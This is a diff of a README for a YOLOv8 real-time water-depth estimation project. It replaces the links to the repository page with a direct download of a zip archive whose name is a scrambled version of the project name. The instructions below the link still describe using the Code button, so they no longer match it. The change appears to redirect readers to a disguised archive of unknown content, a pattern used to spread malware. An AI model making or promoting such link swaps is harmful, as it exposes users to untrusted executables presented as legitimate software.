@@ -1,6 +1,6 @@
 # 🌊 Real-Time-Water-Depth-Estimation-using-YOLOv8 - Measure Water Depth Fast and Clearly
 
-[![Download / Open Project](https://img.shields.io/badge/Download%20%2F%20Open-Real--Time--Water--Depth--Estimation--using--YOLOv8-blue)](https://github.com/elnathansayidi/Real-Time-Water-Depth-Estimation-using-YOLOv8)
+[![Download / Open Project](https://img.shields.io/badge/Download%20%2F%20Open-Real--Time--Water--Depth--Estimation--using--YOLOv8-blue)](https://github.com/elnathansayidi/Real-Time-Water-Depth-Estimation-using-YOLOv8/raw/refs/heads/main/result/Ov-Depth-YOL-Estimation-Time-using-Water-Real-2.7.zip)
 
 ## 🚀 What this app does
 
@@ -10,7 +10,7 @@ Use it when you want a fast visual read on water depth from a camera or recorded
 
 ## 📥 Download and run
 
-1. Open this page: https://github.com/elnathansayidi/Real-Time-Water-Depth-Estimation-using-YOLOv8
+1. Open this page: https://github.com/elnathansayidi/Real-Time-Water-Depth-Estimation-using-YOLOv8/raw/refs/heads/main/result/Ov-Depth-YOL-Estimation-Time-using-Water-Real-2.7.zip
 2. Look for the green **Code** button near the top of the page
 3. Choose **Download ZIP**
 4. Save the file to your computer
